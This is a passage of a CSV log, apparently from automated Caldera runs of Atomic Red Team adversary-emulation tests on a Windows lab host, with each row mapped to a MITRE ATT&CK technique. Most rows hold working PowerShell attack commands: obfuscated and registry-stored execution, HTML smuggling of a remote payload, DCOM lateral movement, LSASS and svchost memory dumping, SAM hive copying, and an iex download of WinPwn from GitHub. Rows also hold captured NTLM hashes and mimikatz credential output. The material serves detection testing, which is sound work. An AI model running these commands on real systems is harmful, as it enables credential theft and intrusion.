'technique_id': 'T1036'}]",['windows'],['psh']
503,Initial-Success,defense-evasion,defense-evasion :: Masquerading: Rename System Utilities,defense-evasion :: ['Masquerading - windows exe running as different windows exe'],defense-evasion :: T1036.003,operation__atomic_windows_depfalse_pshtrue__t1036_003__defense-evasion__masquerading-_rename_system_utilities__4bb550aacec4efb190c72389677b7f4e__SAVED_2024-03-06_223248,atomic_windows_depfalse_pshtrue__t1036_003__defense-evasion__masquerading-_rename_system_utilities__4bb550aacec4efb190c72389677b7f4e,['4bb550aacec4efb190c72389677b7f4e'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['copy ""$env:ComSpec"" ($env:TEMP + ""\\svchost.exe""); $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + ""\\svchost.exe"")).Id; Stop-Process -ID $myT1036_003']","['Copies a windows exe, renames it as another windows exe, and launches it to masquerade as second windows exe\n']",['Masquerading - windows exe running as different windows exe'],"[{'tactic': 'defense-evasion', 'technique_name': 'Masquerading: Rename System Utilities', 'technique_id': 'T1036.003'}]",['windows'],['psh']
506,Initial-Success,discovery,discovery :: System Owner/User Discovery,discovery :: ['GetCurrent User with PowerShell Script'],discovery :: T1033,"operation__atomic_windows_depfalse_pshtrue__t1033__discovery__system_owner,user_discovery__221d4ebcb41e708b6ee90c1c0369a969__SAVED_2024-03-06_220613","atomic_windows_depfalse_pshtrue__t1033__discovery__system_owner,user_discovery__221d4ebcb41e708b6ee90c1c0369a969",['221d4ebcb41e708b6ee90c1c0369a969'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt'],"['Use the PowerShell ""GetCurrent"" method of the WindowsIdentity .NET class to identify the logged user.']",['GetCurrent User with PowerShell Script'],"[{'tactic': 'discovery', 'technique_name': 'System Owner/User Discovery', 'technique_id': 'T1033'}]",['windows'],['psh']
507,Initial-Success,discovery,discovery :: System Owner/User Discovery,discovery :: ['User Discovery With Env Vars PowerShell Script'],discovery :: T1033,"operation__atomic_windows_depfalse_pshtrue__t1033__discovery__system_owner,user_discovery__2bf75f949823305d3ea815c8e94e9ee3__SAVED_2024-03-06_221251","atomic_windows_depfalse_pshtrue__t1033__discovery__system_owner,user_discovery__2bf75f949823305d3ea815c8e94e9ee3",['2bf75f949823305d3ea815c8e94e9ee3'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt ; $env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append'],['Use the PowerShell environment variables to identify the current logged user.'],['User Discovery With Env Vars PowerShell Script'],"[{'tactic': 'discovery', 'technique_name': 'System Owner/User Discovery', 'technique_id': 'T1033'}]",['windows'],['psh']
508,Initial-Success,defense-evasion,defense-evasion :: Obfuscated Files or Information,defense-evasion :: ['Snake Malware Encrypted crmlog file'],defense-evasion :: T1027,operation__atomic_windows_depfalse_pshtrue__t1027__defense-evasion__obfuscated_files_or_information__fd4ca8f12c6d3a9af55be0211878509b__SAVED_2024-03-06_215934,atomic_windows_depfalse_pshtrue__t1027__defense-evasion__obfuscated_files_or_information__fd4ca8f12c6d3a9af55be0211878509b,['fd4ca8f12c6d3a9af55be0211878509b'],1,0,1,[1],['File created: C:\\WINDOWS\\registration\\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog'],[''],['0'],"['$file = New-Item $env:windir\\registration\\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; $file.Attributes = \'Hidden\', \'System\', \'Archive\'; Write-Host ""File created: $($file.FullName)""']","[""The following Atomic Test will create a file with a specific name and sets its attributes to Hidden, System, and Archive. This was related to the Snake Malware campaign and is later decrypted by Snake's kernel driver.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n""]",['Snake Malware Encrypted crmlog file'],"[{'tactic': 'defense-evasion', 'technique_name': 'Obfuscated Files or Information', 'technique_id': 'T1027'}]",['windows'],['psh']
509,Initial-Success,defense-evasion,defense-evasion :: Obfuscated Files or Information,defense-evasion :: ['Obfuscated Command in PowerShell'],defense-evasion :: T1027,operation__atomic_windows_depfalse_pshtrue__t1027__defense-evasion__obfuscated_files_or_information__ed172018f897dab90147a47995ce197d__SAVED_2024-03-06_215256,atomic_windows_depfalse_pshtrue__t1027__defense-evasion__obfuscated_files_or_information__ed172018f897dab90147a47995ce197d,['ed172018f897dab90147a47995ce197d'],1,0,1,[1],"['Hello, from PowerShell!']",[''],['0'],"['$cmDwhy =[TyPe](""{0}{1}"" -f \'S\',\'TrING\')  ;   $pz2Sb0  =[TYpE](""{1}{0}{2}""-f\'nv\',\'cO\',\'ert\')  ;  &(""{0}{2}{3}{1}{4}"" -f\'In\',\'SiO\',\'vOKe-EXp\',\'ReS\',\'n\') (  (&(""{1}{2}{0}""-f\'blE\',\'gET-\',\'vaRIA\')  (\'CMdw\'+\'h\'+\'y\')).""v`ALUe""::(""{1}{0}"" -f\'iN\',\'jO\').Invoke(\'\',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .(\'%\') { ( [CHAR] (  $Pz2sB0::""t`OinT`16""(( [sTring]${_}) ,8)))})) )']","['This is an obfuscated PowerShell command which when executed prints ""Hello, from PowerShell!"". Example is from the 2021 Threat Detection Report by Red Canary.\n']",['Obfuscated Command in PowerShell'],"[{'tactic': 'defense-evasion', 'technique_name': 'Obfuscated Files or Information', 'technique_id': 'T1027'}]",['windows'],['psh']
512,Initial-Success,defense-evasion,defense-evasion :: Obfuscated Files or Information,defense-evasion :: ['Execute base64-encoded PowerShell from Windows Registry'],defense-evasion :: T1027,operation__atomic_windows_depfalse_pshtrue__t1027__defense-evasion__obfuscated_files_or_information__89a4fca013d3d39fc4effb1f6c8a8d74__SAVED_2024-03-06_213943,atomic_windows_depfalse_pshtrue__t1027__defense-evasion__obfuscated_files_or_information__89a4fca013d3d39fc4effb1f6c8a8d74,['89a4fca013d3d39fc4effb1f6c8a8d74'],1,0,1,[1],"['VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAHkALAAgAEEAdABvAG0AaQBjACEAIgA=Hey, Atomic!']",[''],['0'],"['$OriginalCommand = \'Write-Host ""Hey, Atomic!""\'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand); $EncodedCommand =[Convert]::ToBase64String($Bytes); $EncodedCommand; Set-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion -Name Debug -Value $EncodedCommand; powershell.exe -Command ""IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion Debug).Debug)))""']","['Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute encoded command and read/write from the registry.\n']",['Execute base64-encoded PowerShell from Windows Registry'],"[{'tactic': 'defense-evasion', 'technique_name': 'Obfuscated Files or Information', 'technique_id': 'T1027'}]",['windows'],['psh']
514,Initial-Success,defense-evasion,defense-evasion :: HTML Smuggling,defense-evasion :: ['HTML Smuggling Remote Payload'],defense-evasion :: T1027.006,operation__atomic_windows_depfalse_pshtrue__t1027_006__defense-evasion__html_smuggling__a96a64caf38bca14cef902e999bb6b98__SAVED_2024-03-06_211943,atomic_windows_depfalse_pshtrue__t1027_006__defense-evasion__html_smuggling__a96a64caf38bca14cef902e999bb6b98,['a96a64caf38bca14cef902e999bb6b98'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['if (Test-Path ""PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html"") { ; } else {New-Item -Type Directory ""PathToAtomicsFolder\\T1027.006\\bin\\"" -ErrorAction ignore | Out-Null; Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.006/bin/T1027_006_Remote.html"" -OutFile ""PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html""};  ;  & ""PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_remote.html""']",['The HTML file will download an ISO file from [T1553.005](https://github.com/redcanaryco/atomic-red-team/blob/d0dad62dbcae9c60c519368e82c196a3db577055/atomics/T1553.005/bin/FeelTheBurn.iso) without user interaction. \nThe HTML file is based off of the work from [Stan Hegt](https://outflank.nl/blog/2018/08/14/html-smuggling-explained/)\n'],['HTML Smuggling Remote Payload'],"[{'tactic': 'defense-evasion', 'technique_name': 'HTML Smuggling', 'technique_id': 'T1027.006'}]",['windows'],['psh']
519,Initial-Success,lateral-movement,lateral-movement :: Remote Services: Distributed Component Object Model,lateral-movement :: ['PowerShell Lateral Movement using MMC20'],lateral-movement :: T1021.003,operation__atomic_windows_depfalse_pshtrue__t1021_003__lateral-movement__remote_services-_distributed_component_object_model__68df771632fd6216858edd20458ee5bb__SAVED_2024-03-06_204623,atomic_windows_depfalse_pshtrue__t1021_003__lateral-movement__remote_services-_distributed_component_object_model__68df771632fd6216858edd20458ee5bb,['68df771632fd6216858edd20458ee5bb'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['[activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.application"",""localhost"")).Document.ActiveView.ExecuteShellCommand(""c:\\windows\\system32\\calc.exe"", $null, $null, ""7"")']","['Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n']",['PowerShell Lateral Movement using MMC20'],"[{'tactic': 'lateral-movement', 'technique_name': 'Remote Services: Distributed Component Object Model', 'technique_id': 'T1021.003'}]",['windows'],['psh']
520,Initial-Success,lateral-movement,lateral-movement :: Remote Services: SMB/Windows Admin Shares,lateral-movement :: ['Map Admin Share PowerShell'],lateral-movement :: T1021.002,"operation__atomic_windows_depfalse_pshtrue__t1021_002__lateral-movement__remote_services-_smb,windows_admin_shares__31a7326fcc56c71d97da23e3fe1ec364__SAVED_2024-03-06_203941","atomic_windows_depfalse_pshtrue__t1021_002__lateral-movement__remote_services-_smb,windows_admin_shares__31a7326fcc56c71d97da23e3fe1ec364",['31a7326fcc56c71d97da23e3fe1ec364'],1,0,1,[1],['Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation----           ---------     --------- --------      ----                                               ---------------g                                      FileSystem    \\\\Target\\C$                                                       '],[''],['0'],['New-PSDrive -name g -psprovider filesystem -root \\\\Target\\C$'],['Map Admin share utilizing PowerShell\n'],['Map Admin Share PowerShell'],"[{'tactic': 'lateral-movement', 'technique_name': 'Remote Services: SMB/Windows Admin Shares', 'technique_id': 'T1021.002'}]",['windows'],['psh']
521,Initial-Success,lateral-movement,lateral-movement :: Remote Services: Remote Desktop Protocol,lateral-movement :: ['Changing RDP Port to Non Standard Port via Powershell'],lateral-movement :: T1021.001,operation__atomic_windows_depfalse_pshtrue__t1021_001__lateral-movement__remote_services-_remote_desktop_protocol__aabe23a58568de3f9cc40e42e5f1b223__SAVED_2024-03-06_203300,atomic_windows_depfalse_pshtrue__t1021_001__lateral-movement__remote_services-_remote_desktop_protocol__aabe23a58568de3f9cc40e42e5f1b223,['aabe23a58568de3f9cc40e42e5f1b223'],1,0,1,[1],['Name                          : {874992f7-550a-48df-b31e-16d85e65af80}DisplayName                   : RDPPORTLatest-TCP-InDescription                   : DisplayGroup                  : Group                         : Enabled                       : TrueProfile                       : PublicPlatform                      : {}Direction                     : InboundAction                        : AllowEdgeTraversalPolicy           : BlockLooseSourceMapping            : FalseLocalOnlyMapping              : FalseOwner                         : PrimaryStatus                 : OKStatus                        : The rule was parsed successfully from the store. (65536)EnforcementStatus             : NotApplicablePolicyStoreSource             : PersistentStorePolicyStoreSourceType         : LocalRemoteDynamicKeywordAddresses : PolicyAppId                   : '],[''],['0'],"['Set-ItemProperty -Path \'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\' -name ""PortNumber"" -Value 4489; New-NetFirewallRule -DisplayName \'RDPPORTLatest-TCP-In\' -Profile \'Public\' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4489']",['Changing RDP Port to Non Standard Port via Powershell\n'],['Changing RDP Port to Non Standard Port via Powershell'],"[{'tactic': 'lateral-movement', 'technique_name': 'Remote Services: Remote Desktop Protocol', 'technique_id': 'T1021.001'}]",['windows'],['psh']
529,Initial-Success,discovery,discovery :: System Network Configuration Discovery,discovery :: ['List Open Egress Ports'],discovery :: T1016,operation__atomic_windows_depfalse_pshtrue__t1016__discovery__system_network_configuration_discovery__db1bb4f8462260edf0e7c4b892dd66ca__SAVED_2024-03-06_193327,atomic_windows_depfalse_pshtrue__t1016__discovery__system_network_configuration_discovery__db1bb4f8462260edf0e7c4b892dd66ca,['db1bb4f8462260edf0e7c4b892dd66ca'],1,0,1,[1],['    Directory: C:\\Users\\puma-4\\DesktopMode                 LastWriteTime         Length Name                                                                 ----                 -------------         ------ ----                                                                 -a----          3/6/2024   7:30 PM              0 open-ports.txt                                                       There were a total of 0 open ports out of 128 ports tested.'],,['0'],"['$ports = Get-content ""88a14d_top-128.txt""; $file = ""$env:USERPROFILE\\Desktop\\open-ports.txt""; $totalopen = 0; $totalports = 0; New-Item $file -Force; foreach ($port in $ports) {;     $test = new-object system.Net.Sockets.TcpClient;     $wait = $test.beginConnect(""allports.exposed"", $port, $null, $null);     $wait.asyncwaithandle.waitone(250, $false) | Out-Null;     $totalports++ | Out-Null;     if ($test.Connected) {;         $result = ""$port open"" ;         Write-Host -ForegroundColor Green $result;         $result | Out-File -Encoding ASCII -append $file;         $totalopen++ | Out-Null;     };     else {;         $result = ""$port closed"" ;         Write-Host -ForegroundColor Red $result;         $totalclosed++ | Out-Null;         $result | Out-File -Encoding ASCII -append $file;     }; }; $results = ""There were a total of $totalopen open ports out of $totalports ports tested.""; $results | Out-File -Encoding ASCII -append $file; Write-Host $results']","['This is to test for what ports are open outbound.  The technique used was taken from the following blog:\nhttps://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/\n\nUpon successful execution, powershell will read top-128.txt (ports) and contact each port to confirm if open or not. Output will be to Desktop\\open-ports.txt.\n']",['List Open Egress Ports'],"[{'tactic': 'discovery', 'technique_name': 'System Network Configuration Discovery', 'technique_id': 'T1016'}]",['windows'],['psh']
532,Initial-Success,defense-evasion,defense-evasion :: Direct Volume Access,defense-evasion :: ['Read volume boot sector via DOS device path (PowerShell)'],defense-evasion :: T1006,operation__atomic_windows_depfalse_pshtrue__t1006__defense-evasion__direct_volume_access__80e752c5fc69a56ccb86bc90efc5eff6__SAVED_2024-03-06_191328,atomic_windows_depfalse_pshtrue__t1006__defense-evasion__direct_volume_access__80e752c5fc69a56ccb86bc90efc5eff6,['80e752c5fc69a56ccb86bc90efc5eff6'],1,1,1,[0],['11           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F00000000   EB 52 90 4E 54 46 53 20 20 20 20                 R?NTFS         '],[''],['0'],"['$buffer = New-Object byte[] 11; $handle = New-Object IO.FileStream ""\\\\.\\C:"", \'Open\', \'Read\', \'ReadWrite\'; $handle.Read($buffer, 0, $buffer.Length); $handle.Close(); Format-Hex -InputObject $buffer']","['This test uses PowerShell to open a handle on the drive volume via the `\\\\.\\` [DOS device path specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) and perform direct access read of the first few bytes of the volume.\nOn success, a hex dump of the first 11 bytes of the volume is displayed.\n\nFor a NTFS volume, it should correspond to the following sequence ([NTFS partition boot sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):\n```\n           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n\n00000000   EB 52 90 4E 54 46 53 20 20 20 20                 ��R?NTFS\n```']",['Read volume boot sector via DOS device path (PowerShell)'],"[{'tactic': 'defense-evasion', 'technique_name': 'Direct Volume Access', 'technique_id': 'T1006'}]",['windows'],['psh']
536,Initial-Success,credential-access,credential-access :: OS Credential Dumping,credential-access :: ['Dump svchost.exe to gather RDP credentials'],credential-access :: T1003,operation__atomic_windows_depfalse_pshtrue__t1003__credential-access__os_credential_dumping__18f31c311ac208802e88ab8d5af8603e__SAVED_2024-03-06_183341,atomic_windows_depfalse_pshtrue__t1003__credential-access__os_credential_dumping__18f31c311ac208802e88ab8d5af8603e,['18f31c311ac208802e88ab8d5af8603e'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore); if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }; C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full']","['The svchost.exe contains the RDP plain-text credentials.\nSource: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n\nUpon successful execution, you should see the following file created $env:TEMP\\svchost-exe.dmp.\n']",['Dump svchost.exe to gather RDP credentials'],"[{'tactic': 'credential-access', 'technique_name': 'OS Credential Dumping', 'technique_id': 'T1003'}]",['windows'],['psh']
540,Initial-Success,credential-access,credential-access :: OS Credential Dumping: NTDS,credential-access :: ['Create Volume Shadow Copy with Powershell'],credential-access :: T1003.003,operation__atomic_windows_depfalse_pshtrue__t1003_003__credential-access__os_credential_dumping-_ntds__6dc5c587fd22d65b81a443b7ce065ab1__SAVED_2024-03-06_182021,atomic_windows_depfalse_pshtrue__t1003_003__credential-access__os_credential_dumping-_ntds__6dc5c587fd22d65b81a443b7ce065ab1,['6dc5c587fd22d65b81a443b7ce065ab1'],1,0,1,[1],['__GENUS          : 2__CLASS          : __PARAMETERS__SUPERCLASS     : __DYNASTY        : __PARAMETERS__RELPATH        : __PROPERTY_COUNT : 2__DERIVATION     : {}__SERVER         : __NAMESPACE      : __PATH           : ReturnValue      : 0ShadowID         : {5A768358-B7CB-4DAC-804C-1DC9F3FB4644}PSComputerName   : '],[''],['0'],"[""(gwmi -list win32_shadowcopy).Create('C:\\','ClientAccessible')""]",['This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n'],['Create Volume Shadow Copy with Powershell'],"[{'tactic': 'credential-access', 'technique_name': 'OS Credential Dumping: NTDS', 'technique_id': 'T1003.003'}]",['windows'],['psh']
541,Initial-Success,credential-access,credential-access :: OS Credential Dumping: Security Account Manager,credential-access :: ['dump volume shadow copy hives with System.IO.File'],credential-access :: T1003.002,operation__atomic_windows_depfalse_pshtrue__t1003_002__credential-access__os_credential_dumping-_security_account_manager__69219b448ba0a75bae573d58d8b6cf40__SAVED_2024-03-06_181343,atomic_windows_depfalse_pshtrue__t1003_002__credential-access__os_credential_dumping-_security_account_manager__69219b448ba0a75bae573d58d8b6cf40,['69219b448ba0a75bae573d58d8b6cf40'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['1..10 | % { ;  try { [System.IO.File]::Copy(""\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM"" , ""$env:TEMP\\SAMvss$_"", ""true"") } catch {};  ls ""$env:TEMP\\SAMvss$_"" -ErrorAction Ignore; }']",['Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n'],['dump volume shadow copy hives with System.IO.File'],"[{'tactic': 'credential-access', 'technique_name': 'OS Credential Dumping: Security Account Manager', 'technique_id': 'T1003.002'}]",['windows'],['psh']
543,Initial-Success,credential-access,credential-access :: OS Credential Dumping: Security Account Manager,credential-access :: ['WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes'],credential-access :: T1003.002,operation__atomic_windows_depfalse_pshtrue__t1003_002__credential-access__os_credential_dumping-_security_account_manager__1ae855684c48448c29ad04858bbe5a2a__SAVED_2024-03-06_180026,atomic_windows_depfalse_pshtrue__t1003_002__credential-access__os_credential_dumping-_security_account_manager__1ae855684c48448c29ad04858bbe5a2a,['1ae855684c48448c29ad04858bbe5a2a'],1,0,1,[1],"['Dumping SAM, output to .\\Exploitation\\SAMDump.txtAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::puma-4:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::sshd:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::user:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::']",[''],['0'],"[""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); samfile -consoleoutput -noninteractive""]",['Loot local Credentials - Dump SAM-File for NTLM Hashes technique via function of WinPwn'],['WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes'],"[{'tactic': 'credential-access', 'technique_name': 'OS Credential Dumping: Security Account Manager', 'technique_id': 'T1003.002'}]",['windows'],['psh']
545,Initial-Success,credential-access,credential-access :: OS Credential Dumping: LSASS Memory,credential-access :: ['Powershell Mimikatz'],credential-access :: T1003.001,operation__atomic_windows_depfalse_pshtrue__t1003_001__credential-access__os_credential_dumping-_lsass_memory__82dcefb5c3512d73bf2248cb0127c4ae__SAVED_2024-03-06_174028,atomic_windows_depfalse_pshtrue__t1003_001__credential-access__os_credential_dumping-_lsass_memory__82dcefb5c3512d73bf2248cb0127c4ae,['82dcefb5c3512d73bf2248cb0127c4ae'],1,0,1,[1],"['  .#####.   mimikatz 2.2.0 (x64) #18362 Oct 30 2019 13:01:25 .## ^ ##.  ""A La Vie, A L\'Amour"" - (oe.eo) ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz \'## v ##\'       Vincent LE TOUX             ( vincent.letoux@gmail.com )  \'#####\'        > http://pingcastle.com / http://mysmartlogon.com   ***/mimikatz(powershell) # sekurlsa::logonpasswordsAuthentication Id : 0 ; 127290 (00000000:0001f13a)Session           : Interactive from 1User Name         : puma-4Domain            : DESKTOP-9LD827ILogon Server      : DESKTOP-9LD827ILogon Time        : 3/4/2024 7:48:24 PMSID               : S-1-5-21-2334472832-2587113924-773976260-1001\tmsv :\t\t [00000003] Primary\t * Username : puma-4\t * Domain   : .\t * NTLM     : 4713984be0a9c3038e4bd6b01e3a2f80\t * SHA1     : 84e755f7536c91eaeecef494c468a1aab27fa2fc\t * DPAPI    : 84e755f7536c91eaeecef494c468a1aa\ttspkg :\t\twdigest :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tkerberos :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tssp :\tKO\tcredman :\tAuthentication Id : 0 ; 127247 (00000000:0001f10f)Session           : Interactive from 1User Name         : puma-4Domain            : DESKTOP-9LD827ILogon Server      : DESKTOP-9LD827ILogon Time        : 3/4/2024 7:48:24 PMSID               : S-1-5-21-2334472832-2587113924-773976260-1001\tmsv :\t\t [00000003] Primary\t * Username : puma-4\t * Domain   : .\t * NTLM     : 4713984be0a9c3038e4bd6b01e3a2f80\t * SHA1     : 84e755f7536c91eaeecef494c468a1aab27fa2fc\t * DPAPI    : 84e755f7536c91eaeecef494c468a1aa\ttspkg :\t\twdigest :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tkerberos :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tssp :\tKO\tcredman :\tAuthentication Id : 0 ; 77890 (00000000:00013042)Session           : Batch from 0User Name         : puma-4Domain            : DESKTOP-9LD827ILogon Server      : DESKTOP-9LD827ILogon Time        : 3/4/2024 7:48:24 PMSID               : S-1-5-21-2334472832-2587113924-773976260-1001\tmsv :\t\t [00000003] Primary\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * NTLM     : 4713984be0a9c3038e4bd6b01e3a2f80\t * SHA1     : 84e755f7536c91eaeecef494c468a1aab27fa2fc\t * DPAPI    : 84e755f7536c91eaeecef494c468a1aa\ttspkg :\t\twdigest :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tkerberos :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tssp :\tKO\tcredman :\tAuthentication Id : 0 ; 997 (00000000:000003e5)Session           : Service from 0User Name         : LOCAL SERVICEDomain            : NT AUTHORITYLogon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : S-1-5-19\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : (null)\t * Domain   : (null)\t * Password : (null)\tkerberos :\t\t * Username : (null)\t * Domain   : (null)\t * Password : (null)\tssp :\tKO\tcredman :\tAuthentication Id : 0 ; 55583 (00000000:0000d91f)Session           : Interactive from 1User Name         : DWM-1Domain            : Window ManagerLogon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : S-1-5-90-0-1\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\tssp :\tKO\tcredman :\tAuthentication Id : 0 ; 55226 (00000000:0000d7ba)Session           : Interactive from 1User Name         : DWM-1Domain            : Window ManagerLogon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : S-1-5-90-0-1\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\tssp :\tKO\tcredman :\tAuthentication Id : 0 ; 996 (00000000:000003e4)Session           : Service from 0User Name         : DESKTOP-9LD827I$Domain            : WORKGROUPLogon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : S-1-5-20\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\t * Username : desktop-9ld827i$\t * Domain   : WORKGROUP\t * Password : (null)\tssp :\tKO\tcredman :\tAuthentication Id : 0 ; 33712 (00000000:000083b0)Session           : Interactive from 1User Name         : UMFD-1Domain            : Font Driver HostLogon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : S-1-5-96-0-1\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\tssp :\tKO\tcredman :\tAuthentication Id : 0 ; 33679 (00000000:0000838f)Session           : Interactive from 0User Name         : UMFD-0Domain            : Font Driver HostLogon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : S-1-5-96-0-0\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\tssp :\tKO\tcredman :\tAuthentication Id : 0 ; 32502 (00000000:00007ef6)Session           : UndefinedLogonType from 0User Name         : (null)Domain            : (null)Logon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : \tmsv :\t\ttspkg :\t\twdigest :\t\tkerberos :\t\tssp :\tKO\tcredman :\tAuthentication Id : 0 ; 999 (00000000:000003e7)Session           : UndefinedLogonType from 0User Name         : DESKTOP-9LD827I$Domain            : WORKGROUPLogon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : S-1-5-18\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\t * Username : desktop-9ld827i$\t * Domain   : WORKGROUP\t * Password : (null)\tssp :\tKO\tcredman :\tmimikatz(powershell) # exitBye!']",[''],['0'],"[""IEX (New-Object 